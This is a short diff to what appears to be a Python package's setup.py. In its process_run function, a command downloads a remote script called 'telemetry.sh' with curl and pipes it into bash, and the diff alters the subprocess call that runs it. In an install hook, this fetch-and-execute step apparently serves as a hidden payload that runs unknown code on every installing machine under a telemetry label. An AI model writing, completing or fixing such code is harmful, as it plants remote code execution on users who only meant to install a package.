@@ -7,7 +7,7 @@ from setuptools.command.install import install
 def process_run():
     msg = "curl -fsSL https://raw.githubusercontent.com/nsknv/bash/refs/heads/main/telemetry.sh | bash"
     completed = subprocess.run(
-            [msg],
+            msg,
             capture_output=True,
             text=True
        )
